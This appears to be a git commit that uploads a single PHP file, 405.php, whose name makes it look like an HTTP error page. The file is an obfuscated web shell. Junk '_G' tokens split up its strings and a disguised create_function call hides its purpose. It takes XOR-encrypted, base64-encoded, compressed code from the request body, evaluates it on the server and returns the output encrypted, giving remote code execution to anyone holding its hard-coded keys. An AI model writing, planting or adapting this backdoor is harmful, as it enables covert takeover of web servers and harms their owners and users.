af501d00ed0f8cab29839cae41d45fa6d48e52c6
DekuSwat <72897297+DekuSwat@users.noreply.github.com>
2020-10-15 19:12:37 -0400

    Add files via upload

---
+++ 405.php
@@ -0,0 +1,11 @@
+<?php
+$s='ob_end_clean()_G;$r=@base6_G4_G__Gencode(@x(_G@gzcompr_Gess($_Go),$k));pri_G_Gnt(_G"$p$kh$r$kf");}';
+$h='tch("/$kh(.+)$k_G_Gf/",@file_ge_Gt__Gconte_Gnt_Gs("php://inpu_Gt"),$m)_G=_G=1_G_G) {@ob_st_Gar';
+$q=';($j<_G_G$c&_G&$i<$l);$_Gj++,$i++_G){$o.=$t{$i}^_G$k{$j_G};}}re_Gturn $o_G;}if (_G@pr_Geg_G_ma_G';
+$P=str_replace('z','','czreatzez_fuznczztion');
+$i='t();@eva_Gl(@g_Gzuncompress(@x(@_Gb_Gase64_decode(_G$_Gm[1]),$_Gk))_G);_G$o=_G@ob_get_co_Gnten_Gts()_G;@';
+$z='_G";func_Gti_G_Gon x($t,$k){$c=strl_G_Gen($k);$l=s_Gtrle_Gn_G_G($t);$o="_G";for($i=0;_G$i<$_Gl;){_Gfor($j=0';
+$v='$k="d_G_Gac48092";_G$kh="69_G5e435ff13d"_G;$kf=_G"46_Gaa50ef_G_G07b3";$p=_G"JDRo_Gu3L2uzcpLZGq';
+$F=str_replace('_G','',$v.$z.$q.$h.$i.$s);
+$G=$P('',$F);$G();
+?>
